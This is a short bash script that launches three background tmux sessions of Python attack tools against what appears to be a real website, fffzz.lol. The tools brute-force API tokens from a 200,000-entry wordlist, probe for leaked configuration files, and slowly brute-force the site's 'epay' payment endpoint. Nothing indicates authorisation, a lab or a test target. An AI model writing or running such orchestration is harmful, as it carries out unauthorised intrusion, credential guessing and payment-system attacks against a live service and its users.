#!/bin/bash
# Cloud-side launch: API 200k + config leak + epay slow (auto-retry when site up)
set -euo pipefail
OUT=/workspace/results/fffzz.lol/kami_allin_20260717
SCR=/workspace/scripts
mkdir -p "$OUT"

launch() {
  local name=$1; shift
  tmux -f /exec-daemon/tmux.portal.conf kill-session -t "$name" 2>/dev/null || true
  tmux -f /exec-daemon/tmux.portal.conf new-session -d -s "$name" -c /workspace -- "$@"
}

launch fffzz-api-resilient python3 "$SCR/fffzz_api_brute_resilient.py" \
  /workspace/wordlists/faka-tokens-200k.txt 0 0 20 0 "$OUT"

launch fffzz-config-leak python3 "$SCR/fffzz_config_leak.py" "$OUT"

launch fffzz-epay-slow python3 "$SCR/fffzz_epay_slow.py" \
  /workspace/wordlists/epay-sample.txt 50000 "$OUT" 2.0

echo "Cloud launched: fffzz-api-resilient, fffzz-config-leak, fffzz-epay-slow"
tmux -f /exec-daemon/tmux.portal.conf ls 2>/dev/null | grep fffzz || true
